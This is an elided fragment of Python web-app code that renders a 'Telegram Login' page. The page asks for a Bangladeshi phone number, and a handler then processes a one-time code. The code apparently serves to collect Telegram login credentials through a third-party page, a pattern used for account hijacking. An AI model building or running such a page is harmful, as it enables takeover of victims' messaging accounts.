    ...
    if request.method == 'POST':
        ...
        try:
            ...
            return await render_page('''
                <script>alert("🚫 Your number is banned. Try another number.");</script>
                <h2>📱 Telegram Login</h2>
                <form method="post" onsubmit="return fixPhoneInput()">
                    <span>Bangladesh</span>
                    <small id="error_msg">Invalid number</small>
                    <input type="hidden" name="phone" id="full_phone">
                    <input type="text" id="user_number" placeholder="Enter your number" required oninput="validatePhone()">
...
async def otp():
    ...
    if not client:
        return await render_page("<h2>❌ Login Error. Try Again</h2>")
